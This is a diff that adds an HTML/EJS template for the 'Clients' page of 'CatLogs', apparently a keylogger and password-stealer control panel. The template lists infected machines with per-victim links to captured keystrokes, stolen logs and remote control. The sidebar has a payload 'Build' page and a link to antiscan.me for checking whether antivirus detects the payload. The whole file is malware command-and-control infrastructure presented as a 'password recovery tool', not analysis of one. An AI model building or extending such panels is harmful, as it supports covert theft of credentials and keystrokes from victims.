@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+   <meta charset="utf-8">
+   <title>CatLogs – Clients</title>
+   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+   <meta name="description" content="The best password recovery tool">
+   <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+   <meta name="googlebot" content="noindex">
+   <meta name="googlebot-news" content="nosnippet">
+   <link rel="stylesheet" href="../../assets/style.css">
+   <link rel="stylesheet" href="../../assets/boxicons.css">
+   
+   <script src="../../assets/jquery.js"></script>
+
+   <script src="https://cdn.datatables.net/1.12.1/js/jquery.dataTables.min.js"></script>
+</head>
+
+<body cz-shortcut-listen="true">
+   <div class="sidebar">
+      <div class="logo-details">
+         <img class="logo" src="../../assets/cat.png" alt="DuckLogs">
+         <span class="logo_name">CatLogs</span>
+      </div>
+      <ul class="nav-links">
+         <li>
+            <a href="/dashboard">
+               <i class="bx bx-grid-alt"></i>
+               <span class="link_name">Dashboard</span>
+            </a>
+            <ul class="sub-menu blank">
+               <li><a class="link_name" href="/dashboard">Dashboard</a></li>
+            </ul>
+         </li>
+         <li>
+            <div class="iocn-link">
+               <a href="/clients">
+                  <i class="bx bx-bug"></i>
+                  <span class="link_name">Infected</span>
+               </a>
+               <i class="bx bxs-chevron-down arrow"></i>
+            </div>
+            <ul class="sub-menu">
+               <li><a class="link_name" href="/clients">Infected</a></li>
+               <li><a href="/clients">Clients</a></li>
+            </ul>
+         </li>
+         
+         <li>
+            <div class="iocn-link">
+               <a href="/builder">
+                  <i class="bx bx-wrench"></i>
+                  <span class="link_name">Build</span>
+               </a>
+               
+            </div>
+          
+         </li>
+         </li>
+         <li>
+            <a href="https://antiscan.me/" target="_blank">
+               <i class="bx bx-check-shield"></i>
+               <span class="link_name">Scanner</span>
+            </a>
+            <ul class="sub-menu blank">
+               <li><a class="link_name" href="https://antiscan.me/" target="_blank">Scanner</a></li>
+            </ul>
+         </li>
+         <li>
+            <div class="iocn-link">
+               <a href="/settings">
+                  <i class="bx bx-cog"></i>
+                  <span class="link_name">Settings</span>
+               </a>
+               <i class="bx bxs-chevron-down arrow"></i>
+            </div>
+            <ul class="sub-menu">
+               <li><a class="link_name" href="/settings">Settings</a></li>
+               <li><a href="/settings">General</a></li>
+            </ul>
+         </li>
+         <li>
+         </li>
+        
+         <li>
+            <div class="profile-details">
+               <div class="profile-content">
+                  <img src="https://www.nulled.to/uploads/profile/photo-4668197.png" alt="profileImg">
+               </div>
+               <div class="name-job">
+                  <div class="profile_name">Default</div>
+                  <div class="job">User</div>
+               </div>
+               <a href="/logout"><i class="bx bx-log-out"></i></a>
+            </div>
+         </li>
+      </ul>
+   </div>
+   
+   <script>setTimeout(function () { $(".topcorner").fadeOut("normal"); }, 1200);</script>
+   <div class="container" style="padding-top: 100px; max-width: 1160px;">
+      
+      <div class="board">
+         
+         <div class="table-clients">
+            <div class="head">
+               Clients
+            </div>
+            <center>
+               <div class="table-clients2">
+                  <table style="border-spacing: 40px; border-collapse: separate;" id="myTable">
+                    <thead>
+                        <tr>
+                          <th>HWID</th>
+                          <th>Country</th>
+                          <th>Username</th>
+                          <th>Infection Date</th>
+                          <th>Keystrokes</th>
+                          <th>Logs</th>
+                          <th>Control</th>
+                        </tr>
+                      </thead>
+                     <tbody>
+                        <tr>
+                            <td style="padding-left: 20px;">1</td>
+                            <td style="padding-left: 20px;">US</td>
+                            <td style="padding-left: 20px;">Admin</td>
+                            <td style="padding-left: 20px;">01/02/2022</td>
+                            <td style="padding-left: 20px;"><a href="#"><i class='bx bx-key' style='color:red' id="big2"></a></i></td>
+                            <td style="padding-left: 20px;"><a href="#"><i class='bx bx-server' style='color:greenyellow' id="big2"></a></td>
+                            <td style="padding-left: 20px;"><a href="#"><i class='bx bx-cog' style='color:orange' id="big2"></i></a></td>
+                            
+                        </tr>
+
+                        <tr>
+                            <td style="padding-left: 20px;">2</td>
+                            <td style="padding-left: 20px;">FR</td>
+                            <td style="padding-left: 20px;">Demo</td>
+                            <td style="padding-left: 20px;">01/02/2022</td>
+                            <td style="padding-left: 20px;"><a href="#"><i class='bx bx-key' style='color:red' id="big2"></a></i></td>
+                            <td style="padding-left: 20px;"><a href="#"><i class='bx bx-server' style='color:greenyellow' id="big2"></a></td>
+                            <td style="padding-left: 20px;"><a href="#"><i class='bx bx-cog' style='color:orange' id="big2"></i></a></td>
+                            
+                        </tr>
+                        <% for(let i = 0; i < clients.length; i++) { %>
+                            <tr>
+                               <td><%= clients[i].hwid %></td>
+                               <td><%= clients[i].country %></td>
+                               <td><%= clients[i].username %></td>
+                               <td><%= clients[i].date %></td>
+                               <td style="padding-left: 20px;"><a href="/gkl?hwid=<%= clients[i].hwid %>"><i class='bx bx-key' style='color:red' id="big2"></a></i></td>
+                               <td style="padding-left: 20px;"><a href="/gl?hwid=<%= clients[i].hwid %>"><i class='bx bx-server' style='color:greenyellow' id="big2"></a></td>
+                               <td style="padding-left: 20px;"><a href="/c?hwid=<%= clients[i].hwid %>"><i class='bx bx-cog' style='color:orange' id="big2"></i></a></td>
+                            </tr>
+                            <% } %>
+                        
+                     </tbody>
+                  </table>
+               </div>
+            </center>
+            
+         </div>
+      </div>
+   </div>
+   <script src="../../assets/sideBar.js"></script>
+   <script>$(document).ready( function () {
+        $('#myTable').DataTable();
+    } );</script>
+</body>
+
+</html>
